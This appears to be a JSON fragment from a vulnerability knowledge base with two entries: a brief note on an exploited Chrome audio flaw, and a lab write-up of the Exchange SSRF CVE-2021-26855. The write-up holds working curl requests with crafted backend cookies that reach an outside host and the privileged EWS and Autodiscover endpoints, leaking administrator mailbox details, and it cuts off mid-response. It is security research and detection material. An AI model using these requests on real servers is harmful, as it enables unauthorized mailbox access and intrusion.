      "document": "Reported as exploited in the wild at https://threatpost.com/google-patches-actively-exploited-flaw-in-chrome-browser/164468/ and at https://chromereleases.googleblog.com/2021/03/stable-channel-update-for-desktop.html.\r\n\r\nDetails are still scant on this vulnerability as they are being withheld by Google until more people have patched the issue, which was fixed in Chrome 89.0.4389.72. All that we know is that the bug is labeled as an `Object lifecycle issue in audio` and was found by `Alison Huffman, Microsoft Browser Vulnerability Research on 2021-02-11`.\r\n\r\nGiven the description of this vulnerability as well as its link to a similar vulnerability exploited in the wild in the past (see https://threatpost.com/google-discloses-chrome-flaw-exploited-in-the-wild/149784/), its likely that this is a UAF vulnerability. Given the one used in https://threatpost.com/google-discloses-chrome-flaw-exploited-in-the-wild/149784/ was a bug in the same component which was then used in the WizardOpium attacks, its likely that this vulnerability will lead to full compromise of the system given past history.\r\n\r\nUsers are encouraged to disable JavaScript where possible, particularly for untrusted sites, as this is often needed in order to successfully exploit UAF vulnerabilities in the browser. However this is only a temporary fix, and it is strongly encouraged that users instead upgrade to Chrome 89.0.4389.72 or later, Given there is already active exploitation of this vulnerability, and given the history of bugs within this component, there is a good possibility that we may see more widespread exploitation of this issue in the near future.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a5c77ede-3824-4176-a955-d6cf9a6a7417",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "5d17bb38-86bb-4514-bf1d-39eb48fbe4f1",
      "created": "2021-03-09T07:01:33.694054Z",
      "revisionDate": "2021-03-10T17:02:46.411944Z",
      "document": "# CVE-2021-26855\r\n\r\n[CVE-2021-26855](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855) is an SSRF vulnerability in Exchange that allows privileged access to Exchange's backend resources, ultimately leading to pre-auth RCE when [combined](https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/) with CVEs such as [CVE-2021-27065](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065).\r\n\r\n## Microsoft's (Nmap) NSE script\r\n\r\nConveniently disclosed in Microsoft's [alternative mitigations](https://msrc-blog.microsoft.com/2021/03/05/microsoft-exchange-server-vulnerabilities-mitigations-march-2021/), [this script](https://github.com/microsoft/CSS-Exchange/blob/main/Security/http-vuln-cve2021-26855.nse) provides an easily reproducible PoC for CVE-2021-26855. My findings below are reflective of that.\r\n\r\n```\r\nwvu@kharak:~/Downloads$ ls\r\nhttp-vuln-cve2021-26855.nse\r\nwvu@kharak:~/Downloads$ nmap -Pn -T4 -n -v -p 443 --open --script http-vuln-cve2021-26855 192.168.123.183\r\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\r\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 00:50 CST\r\nNSE: Loaded 1 scripts for scanning.\r\nNSE: Script Pre-scanning.\r\nInitiating NSE at 00:50\r\nCompleted NSE at 00:50, 0.00s elapsed\r\nInitiating Connect Scan at 00:50\r\nScanning 192.168.123.183 [1 port]\r\nDiscovered open port 443/tcp on 192.168.123.183\r\nCompleted Connect Scan at 00:50, 0.00s elapsed (1 total ports)\r\nNSE: Script scanning 192.168.123.183.\r\nInitiating NSE at 00:50\r\nCompleted NSE at 00:50, 0.02s elapsed\r\nNmap scan report for 192.168.123.183\r\nHost is up (0.00064s latency).\r\n\r\nPORT    STATE SERVICE\r\n443/tcp open  https\r\n| http-vuln-cve2021-26855:\r\n|   VULNERABLE:\r\n|   Exchange Server SSRF Vulnerability\r\n|     State: VULNERABLE\r\n|     IDs:  CVE:CVE-2021-26855\r\n|       Exchange 2013 Versions < 15.00.1497.012, Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009, Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010 are vulnerable to a SSRF via the X-AnonResource-Backend and X-BEResource cookies.\r\n|\r\n|     Disclosure date: 2021-03-02\r\n|     References:\r\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26855\r\n|_      http://aka.ms/exchangevulns\r\n\r\nNSE: Script Post-scanning.\r\nInitiating NSE at 00:50\r\nCompleted NSE at 00:50, 0.00s elapsed\r\nRead data files from: /usr/local/bin/../share/nmap\r\nNmap done: 1 IP address (1 host up) scanned in 0.26 seconds\r\nwvu@kharak:~/Downloads$\r\n```\r\n\r\n### Ported to [curl(1)](https://curl.se/)...\r\n\r\n```\r\nwvu@kharak:~$ curl -kvb \"X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;\" https://192.168.123.183/owa/auth/x.js\r\n*   Trying 192.168.123.183...\r\n* TCP_NODELAY set\r\n* Connected to 192.168.123.183 (192.168.123.183) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* successfully set certificate verify locations:\r\n*   CAfile: /etc/ssl/cert.pem\r\n  CApath: none\r\n* TLSv1.2 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.2 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256\r\n* ALPN, server accepted to use h2\r\n* Server certificate:\r\n*  subject: CN=WIN-T4RO9496TA7\r\n*  start date: Mar  8 22:45:17 2021 GMT\r\n*  expire date: Mar  8 22:45:17 2026 GMT\r\n*  issuer: CN=WIN-T4RO9496TA7\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n* Using HTTP2, server supports multi-use\r\n* Connection state changed (HTTP/2 confirmed)\r\n* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0\r\n* Using Stream ID: 1 (easy handle 0x7f8cb580b400)\r\n> GET /owa/auth/x.js HTTP/2\r\n> Host: 192.168.123.183\r\n> User-Agent: curl/7.64.1\r\n> Accept: */*\r\n> Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;\r\n>\r\n* Connection state changed (MAX_CONCURRENT_STREAMS == 100)!\r\n< HTTP/2 500\r\n< cache-control: private\r\n< content-type: text/html; charset=utf-8\r\n< server: Microsoft-IIS/10.0\r\n< request-id: 864475e3-ee01-48a5-acf3-1b1cbbc50c02\r\n< x-calculatedbetarget: localhost\r\n< x-calculatedbetarget: localhost\r\n< x-feserver: WIN-T4RO9496TA7\r\n< x-aspnet-version: 4.0.30319\r\n< x-powered-by: ASP.NET\r\n< date: Tue, 09 Mar 2021 06:52:07 GMT\r\n< content-length: 85\r\n<\r\n* Connection #0 to host 192.168.123.183 left intact\r\nNegotiateSecurityContext failed with for host 'localhost' with status 'TargetUnknown'* Closing connection 0\r\nwvu@kharak:~$\r\n```\r\n\r\n## SSRF to an arbitrary remote host\r\n\r\nYou can specify an arbitrary host in `X-AnonResource-Backend`.\r\n\r\n```\r\nwvu@kharak:~$ curl -kvb \"X-AnonResource=true; X-AnonResource-Backend=192.168.123.1~$RANDOM\" \"https://192.168.123.183/owa/auth/$RANDOM.js\"\r\n*   Trying 192.168.123.183...\r\n* TCP_NODELAY set\r\n* Connected to 192.168.123.183 (192.168.123.183) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* successfully set certificate verify locations:\r\n*   CAfile: /etc/ssl/cert.pem\r\n  CApath: none\r\n* TLSv1.2 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.2 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256\r\n* ALPN, server accepted to use h2\r\n* Server certificate:\r\n*  subject: CN=WIN-T4RO9496TA7\r\n*  start date: Mar  8 22:45:17 2021 GMT\r\n*  expire date: Mar  8 22:45:17 2026 GMT\r\n*  issuer: CN=WIN-T4RO9496TA7\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n* Using HTTP2, server supports multi-use\r\n* Connection state changed (HTTP/2 confirmed)\r\n* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0\r\n* Using Stream ID: 1 (easy handle 0x7f9ea080d600)\r\n> GET /owa/auth/22702.js HTTP/2\r\n> Host: 192.168.123.183\r\n> User-Agent: curl/7.64.1\r\n> Accept: */*\r\n> Cookie: X-AnonResource=true; X-AnonResource-Backend=192.168.123.1~4563\r\n>\r\n* Connection state changed (MAX_CONCURRENT_STREAMS == 100)!\r\n```\r\n\r\n### Catching the request in [ncat(1)](https://nmap.org/ncat/)...\r\n\r\n```\r\nwvu@kharak:~$ ncat -lkv --ssl 443\r\nNcat: Version 7.91 ( https://nmap.org/ncat )\r\nNcat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.\r\nNcat: SHA-1 fingerprint: F55B E690 D8F2 84F1 EC64 816A 5763 2F5B B56F 0D72\r\nNcat: Listening on :::443\r\nNcat: Listening on 0.0.0.0:443\r\nNcat: Connection from 192.168.123.183.\r\nNcat: Connection from 192.168.123.183:6303.\r\nGET /owa/auth/22702.js HTTP/1.1\r\nX-FE-ClientIP: 192.168.123.1\r\nX-Forwarded-For: 192.168.123.1\r\nX-Forwarded-Port: 55723\r\nX-MS-EdgeIP:\r\nX-ExCompId: ClientAccessFrontEnd\r\nAccept: */*\r\nUser-Agent: curl/7.64.1\r\nX-OriginalRequestHost: 192.168.123.183\r\nX-OriginalRequestHostSchemePort: 443:https:192.168.123.183\r\nX-MSExchangeActivityCtx: V=1.0.0.0;Id=26678ebf-2d0f-42bd-bac3-2d27889baed8;C=;P=\r\nmsExchProxyUri: https://192.168.123.183/owa/auth/22702.js\r\nX-IsFromCafe: 1\r\nX-SourceCafeServer: WIN-T4RO9496TA7.GIBSON.LOCAL\r\nX-CommonAccessToken: VgEAVAlBbm9ueW1vdXNDAEUAAAAA\r\nX-vDirObjectId: 621dccd3-6dff-49aa-87be-7911a110125e\r\nHost: 192.168.123.1\r\nCookie: X-AnonResource=true; X-AnonResource-Backend=192.168.123.1~4563\r\nConnection: Keep-Alive\r\n```\r\n\r\nThe fun folks working on the [Nuclei scanner](https://github.com/projectdiscovery/nuclei) noticed [burpcollaborator.net](https://burpcollaborator.net/) made a [good target](https://github.com/projectdiscovery/nuclei-templates/pull/1032) for their scanner.\r\n\r\n```\r\nwvu@kharak:~$ curl -kvb \"X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net~$RANDOM\" \"https://192.168.123.183/owa/auth/$RANDOM.js\"\r\n*   Trying 192.168.123.183...\r\n* TCP_NODELAY set\r\n* Connected to 192.168.123.183 (192.168.123.183) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* successfully set certificate verify locations:\r\n*   CAfile: /etc/ssl/cert.pem\r\n  CApath: none\r\n* TLSv1.2 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.2 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256\r\n* ALPN, server accepted to use h2\r\n* Server certificate:\r\n*  subject: CN=WIN-T4RO9496TA7\r\n*  start date: Mar  8 22:45:17 2021 GMT\r\n*  expire date: Mar  8 22:45:17 2026 GMT\r\n*  issuer: CN=WIN-T4RO9496TA7\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n* Using HTTP2, server supports multi-use\r\n* Connection state changed (HTTP/2 confirmed)\r\n* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0\r\n* Using Stream ID: 1 (easy handle 0x7fd58480f600)\r\n> GET /owa/auth/18409.js HTTP/2\r\n> Host: 192.168.123.183\r\n> User-Agent: curl/7.64.1\r\n> Accept: */*\r\n> Cookie: X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net~31368\r\n>\r\n* Connection state changed (MAX_CONCURRENT_STREAMS == 100)!\r\n< HTTP/2 200\r\n< cache-control: private\r\n< content-type: text/html\r\n< server: Microsoft-IIS/10.0\r\n< request-id: 31688df5-982d-4d18-86d1-ae0e99c00ce8\r\n< x-calculatedbetarget: burpcollaborator.net\r\n< x-collaborator-version: 4\r\n< x-aspnet-version: 4.0.30319\r\n< x-powered-by: ASP.NET\r\n< date: Tue, 09 Mar 2021 07:58:52 GMT\r\n< content-length: 1190\r\n<\r\n<!DOCTYPE html>\r\n<html>\r\n<head>\r\n <meta charset=\"UTF-8\">\r\n</head>\r\n<body>\r\n<h1>Burp Collaborator Server</h1>\r\n<p>Burp Collaborator is a service that is used by <a href=\"https://portswigger.net/burp/\">Burp Suite</a> when testing web applications for security\r\nvulnerabilities. Some of Burp Suite's tests may cause the application being\r\ntested to interact with the Burp Collaborator server, to enable Burp Suite\r\nto detect various security vulnerabilities.\r\n</p><p>The Burp Collaborator server does not itself initiate any interactions with\r\nany system, and only responds to interactions that it receives from other\r\nsystems.\r\n</p><p>If you are a systems administrator and you are seeing interactions with the\r\nBurp Collaborator server in your logs, then it is likely that someone is\r\ntesting your web application using Burp Suite. If you are trying to identify\r\nthe person responsible for this testing, you should review your web server\r\nor applications logs for the time at which these interactions were initiated\r\nby your systems.\r\n</p><p>For further details about Burp Collaborator, please see the <a href=\"https://portswigger.net/burp/documentation/collaborator/\">full documentation</a>.</p></body>\r\n* Connection #0 to host 192.168.123.183 left intact\r\n</html>* Closing connection 0\r\nwvu@kharak:~$\r\n```\r\n\r\n## SSRF to a privileged backend resource\r\n\r\nHostname `WIN-T4RO9496TA7` is from the `x-feserver` header.\r\n\r\n```\r\nwvu@kharak:~$ curl -kvb \"X-BEResource=WIN-T4RO9496TA7/EWS/Exchange.asmx?~$RANDOM\" \"https://192.168.123.183/ecp/$RANDOM.js\"\r\n*   Trying 192.168.123.183...\r\n* TCP_NODELAY set\r\n* Connected to 192.168.123.183 (192.168.123.183) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* successfully set certificate verify locations:\r\n*   CAfile: /etc/ssl/cert.pem\r\n  CApath: none\r\n* TLSv1.2 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.2 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256\r\n* ALPN, server accepted to use h2\r\n* Server certificate:\r\n*  subject: CN=WIN-T4RO9496TA7\r\n*  start date: Mar  8 22:45:17 2021 GMT\r\n*  expire date: Mar  8 22:45:17 2026 GMT\r\n*  issuer: CN=WIN-T4RO9496TA7\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n* Using HTTP2, server supports multi-use\r\n* Connection state changed (HTTP/2 confirmed)\r\n* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0\r\n* Using Stream ID: 1 (easy handle 0x7faac2808200)\r\n> GET /ecp/1849.js HTTP/2\r\n> Host: 192.168.123.183\r\n> User-Agent: curl/7.64.1\r\n> Accept: */*\r\n> Cookie: X-BEResource=WIN-T4RO9496TA7/EWS/Exchange.asmx?~22406\r\n>\r\n* Connection state changed (MAX_CONCURRENT_STREAMS == 100)!\r\n< HTTP/2 200\r\n< cache-control: private\r\n< content-type: text/html; charset=UTF-8\r\n< server: Microsoft-IIS/10.0\r\n< request-id: b4762a11-d418-43f8-a435-f04420289a4c\r\n< x-calculatedbetarget: win-t4ro9496ta7\r\n< x-calculatedbetarget: win-t4ro9496ta7.gibson.local\r\n< x-diaginfo: WIN-T4RO9496TA7\r\n< x-beserver: WIN-T4RO9496TA7\r\n< x-feserver: WIN-T4RO9496TA7\r\n< x-aspnet-version: 4.0.30319\r\n< set-cookie: exchangecookie=ef4d50599057429b849b92e9059455af; expires=Wed, 09-Mar-2022 07:00:11 GMT; path=/; HttpOnly\r\n< set-cookie: X-BackEndCookie=S-1-5-18=rJqNiZqNgai2sdKry62wxsvGyau+yNGYlp2MkJHRk5CcnpOBzsbLzc/JzM3MzYHNz83O0s/M0s/Gq8/Ixc7Pxc7O; expires=Tue, 09-Mar-2021 07:10:11 GMT; path=/EWS; secure; HttpOnly\r\n< x-powered-by: ASP.NET\r\n< x-feserver: WIN-T4RO9496TA7\r\n< date: Tue, 09 Mar 2021 07:00:11 GMT\r\n< content-length: 2836\r\n<\r\n<HTML lang=\"en\"><HEAD><link rel=\"alternate\" type=\"text/xml\" href=\"https://win-t4ro9496ta7.gibson.local:444/EWS/Exchange.asmx?disco\"/><STYLE type=\"text/css\">#content{ FONT-SIZE: 0.7em; PADDING-BOTTOM: 2em; MARGIN-LEFT: 30px}BODY{MARGIN-TOP: 0px; MARGIN-LEFT: 0px; COLOR: #000000; FONT-FAMILY: Verdana; BACKGROUND-COLOR: white}P{MARGIN-TOP: 0px; MARGIN-BOTTOM: 12px; COLOR: #000000; FONT-FAMILY: Verdana}PRE{BORDER-RIGHT: #f0f0e0 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #f0f0e0 1px solid; MARGIN-TOP: -5px; PADDING-LEFT: 5px; FONT-SIZE: 1.2em; PADDING-BOTTOM: 5px; BORDER-LEFT: #f0f0e0 1px solid; PADDING-TOP: 5px; BORDER-BOTTOM: #f0f0e0 1px solid; FONT-FAMILY: Courier New; BACKGROUND-COLOR: #e5e5cc}.heading1{MARGIN-TOP: 0px; PADDING-LEFT: 15px; FONT-WEIGHT: normal; FONT-SIZE: 26px; MARGIN-BOTTOM: 0px; PADDING-BOTTOM: 3px; MARGIN-LEFT: -30px; WIDTH: 100%; COLOR: #ffffff; PADDING-TOP: 10px; FONT-FAMILY: Tahoma; BACKGROUND-COLOR: #003366}.intro{display: block; font-size: 1em;}</STYLE><TITLE>Service</TITLE></HEAD><BODY><DIV id=\"content\" role=\"main\"><h1 class=\"heading1\">Service</h1><BR/><P class=\"intro\">You have created a service.<P class='intro'>To test this service, you will need to create a client and use it to call the service. You can do this using the svcutil.exe tool from the command line with the following syntax:</P> <BR/><PRE>svcutil.exe <A HREF=\"https://win-t4ro9496ta7.gibson.local:444/EWS/Services.wsdl\">https://win-t4ro9496ta7.gibson.local:444/EWS/Services.wsdl</A></PRE></P><P class=\"intro\">This will generate a configuration file and a code file that contains the client class. Add the two files to your client application and use the generated client class to call the Service. For example:<BR/></P><h2 class='intro'>C#</h2><br /><PRE><font color=\"blue\">class </font><font color=\"black\">Test\r\n</font>{\r\n<font color=\"blue\">    static void </font>Main()\r\n    {\r\n        <font color=\"black\">HelloClient</font> client = <font color=\"blue\">new </font><font color=\"black\">HelloClient</font>();\r\n\r\n<font color=\"darkgreen\">        // Use the 'client' variable to call operations on the service.\r\n\r\n</font><font color=\"darkgreen\">        // Always close the client.\r\n</font>        client.Close();\r\n    }\r\n}\r\n</PRE><BR/><h2 class='intro'>Visual Basic</h2><br /><PRE><font color=\"blue\">Class </font><font color=\"black\">Test\r\n</font><font color=\"blue\">    Shared Sub </font>Main()\r\n<font color=\"blue\">        Dim </font>client As <font color=\"black\">HelloClient</font> = <font color=\"blue\">New </font><font color=\"black\">HelloClient</font>()\r\n<font color=\"darkgreen\">        ' Use the 'client' variable to call operations on the service.\r\n\r\n</font><font color=\"darkgreen\">        ' Always close the client.\r\n</font>        client.Close()\r\n<font color=\"blue\">    End Sub\r\n* Connection #0 to host 192.168.123.183 left intact\r\n</font><font color=\"blue\">End Class</font></PRE></DIV></BODY></HTML>* Closing connection 0\r\nwvu@kharak:~$\r\n```\r\n\r\n`POST`ing to the [EWS](https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-reference-for-exchange) endpoint (not shown) allows an attacker access to a target's mailbox. A sample [Autodiscover request](https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/pox-autodiscover-request-for-exchange) is shown below.\r\n\r\n```\r\nwvu@kharak:~/Downloads$ cat poc.xml\r\n<?xml version=\"1.0\"?>\r\n<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\">\r\n  <Request>\r\n    <EMailAddress>Administrator@gibson.local</EMailAddress>\r\n    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>\r\n  </Request>\r\n</Autodiscover>\r\nwvu@kharak:~/Downloads$ curl -kvb \"X-BEResource=WIN-T4RO9496TA7/autodiscover/autodiscover.xml?~$RANDOM\" -H \"Content-Type: text/xml\" \"https://192.168.123.207/ecp/$RANDOM.js\" -d @poc.xml\r\n*   Trying 192.168.123.207...\r\n* TCP_NODELAY set\r\n* Connected to 192.168.123.207 (192.168.123.207) port 443 (#0)\r\n* ALPN, offering h2\r\n* ALPN, offering http/1.1\r\n* successfully set certificate verify locations:\r\n*   CAfile: /etc/ssl/cert.pem\r\n  CApath: none\r\n* TLSv1.2 (OUT), TLS handshake, Client hello (1):\r\n* TLSv1.2 (IN), TLS handshake, Server hello (2):\r\n* TLSv1.2 (IN), TLS handshake, Certificate (11):\r\n* TLSv1.2 (IN), TLS handshake, Server key exchange (12):\r\n* TLSv1.2 (IN), TLS handshake, Server finished (14):\r\n* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):\r\n* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (OUT), TLS handshake, Finished (20):\r\n* TLSv1.2 (IN), TLS change cipher, Change cipher spec (1):\r\n* TLSv1.2 (IN), TLS handshake, Finished (20):\r\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256\r\n* ALPN, server accepted to use h2\r\n* Server certificate:\r\n*  subject: CN=WIN-T4RO9496TA7\r\n*  start date: Mar  8 22:45:17 2021 GMT\r\n*  expire date: Mar  8 22:45:17 2026 GMT\r\n*  issuer: CN=WIN-T4RO9496TA7\r\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\r\n* Using HTTP2, server supports multi-use\r\n* Connection state changed (HTTP/2 confirmed)\r\n* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0\r\n* Using Stream ID: 1 (easy handle 0x7fa592808200)\r\n> POST /ecp/3425.js HTTP/2\r\n> Host: 192.168.123.207\r\n> User-Agent: curl/7.64.1\r\n> Accept: */*\r\n> Cookie: X-BEResource=WIN-T4RO9496TA7/autodiscover/autodiscover.xml?~24753\r\n> Content-Type: text/xml\r\n> Content-Length: 354\r\n>\r\n* Connection state changed (MAX_CONCURRENT_STREAMS == 100)!\r\n* We are completely uploaded and fine\r\n< HTTP/2 200\r\n< cache-control: private\r\n< content-type: text/xml; charset=utf-8\r\n< server: Microsoft-IIS/10.0\r\n< request-id: bde5e90a-fe14-4b47-aaca-1a713d9832b1\r\n< x-calculatedbetarget: win-t4ro9496ta7\r\n< x-calculatedbetarget: win-t4ro9496ta7.gibson.local\r\n< x-diaginfo: WIN-T4RO9496TA7\r\n< x-beserver: WIN-T4RO9496TA7\r\n< x-feserver: WIN-T4RO9496TA7\r\n< x-aspnet-version: 4.0.30319\r\n< set-cookie: X-BackEndCookie=S-1-5-18=rJqNiZqNgai2sdKry62wxsvGyau+yNGYlp2MkJHRk5CcnpOBzsbLzc/JzM3MzYHNz83O0s/M0s7Pq8/OxczJxc7G; expires=Wed, 10-Mar-2021 01:36:19 GMT; path=/autodiscover; secure; HttpOnly\r\n< x-powered-by: ASP.NET\r\n< x-feserver: WIN-T4RO9496TA7\r\n< date: Wed, 10 Mar 2021 01:26:19 GMT\r\n< content-length: 3866\r\n<\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/responseschema/2006\">\r\n  <Response xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a\">\r\n    <User>\r\n      <DisplayName>Administrator</DisplayName>\r\n      <LegacyDN>/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=94812d66d68146e8b6ac7b3312a93d7b-Admin</LegacyDN>\r\n      <AutoDiscoverSMTPAddress>Administrator@gibson.local</AutoDiscoverSMTPAddress>\r\n      <DeploymentId>eb64d327-1a67-4c9c-b64d-38d567e95480</DeploymentId>\r\n    </User>\r\n    <Account>\r\n      <AccountType>email</AccountType>\r\n      <Action>settings</Action>\r\n      <MicrosoftOnline>False</MicrosoftOnline>\r\n      <Protocol>\r\n        <Type>EXCH</Type>\r\n        <Server>47f3c51d-2094-4651-b009-c4c4a86a75e4@gibson.local</Server>\r\n        <ServerDN>/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=47f3c51d-2094-4651-b009-c4c4a86a75e4@gibson.local</ServerDN>\r\n        <ServerVersion>73C18880</ServerVersion>\r\n        <MdbDN>/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=47f3c51d-2094-4651-b009-c4c4a86a75e4@gibson.local/cn=Microsoft Private MDB</MdbDN>\r\n        <PublicFolderServer>win-t4ro9496ta7.gibson.local</PublicFolderServer>\r\n        <AD>WIN-T4RO9496TA7.gibson.local</AD>\r\n        <ASUrl>https://win-t4ro9496ta7.gibson.local/EWS/Exchange.asmx</ASUrl>\r\n        <EwsUrl>https://win-t4ro9496ta7.gibson.local/EWS/Exchange.asmx</EwsUrl>\r\n        <EmwsUrl>https://win-t4ro9496ta7.gibson.local/EWS/Exchange.asmx</EmwsUrl>\r\n        <EcpUrl>https://win-t4ro9496ta7.gibson.local/owa/</EcpUrl>\r\n        <EcpUrl-um>?path=/options/callanswering</EcpUrl-um>\r\n        <EcpUrl-aggr>?path=/options/connectedaccounts</EcpUrl-aggr>\r\n        <EcpUrl-mt>options/ecp/PersonalSettings/DeliveryReport.aspx?rfr=olk&exsvurl=1&IsOWA=<IsOWA>&MsgID=<MsgID>&Mbx=<Mbx>&realm=gibson.local</EcpUrl-mt>\r\n        <EcpUrl-ret>?path=/options/retentionpolicies</EcpUrl-ret>\r\n        <EcpUrl-sms>?path=/options/textmessaging</EcpUrl-sms>\r\n        <EcpUrl-photo>?path=/options/myaccount/action/photo</EcpUrl-photo>\r\n        <EcpUrl-tm>options/ecp/?rfr=olk&ftr=TeamMailbox&exsvurl=1&realm=gibson.local</EcpUrl-tm>\r\n        <EcpUrl-tmCreating>options/ecp/?rfr=olk&ftr=TeamMailboxCreating&SPUrl=<SPUrl>&Title=<Title>&SPTMAppUrl=<SPTMAppUrl>&exsvurl=1&realm=gibson.local</EcpUrl-tmCreating>\r\n        <EcpUrl-tmEditing>options/ecp/?rfr=olk&ftr=TeamMailboxEditing&Id=<Id>&exsvurl=1&realm=gibson.local</EcpUrl-tmEditing>\r\n        <EcpUrl-extinstall>?path=/options/manageapps</EcpUrl-extinstall>\r\n        <OOFUrl>https://win-t4ro9496ta7.gibson.local/EWS/Exchange.asmx</OOFUrl>\r\n        <UMUrl>https://win-t4ro9496ta7.gibson.local/EWS/UM2007Legacy.asmx</UMUrl>\r\n        <ServerExclusiveConnect>off</ServerExclusiveConnect>\r\n      </Protocol>\r\n      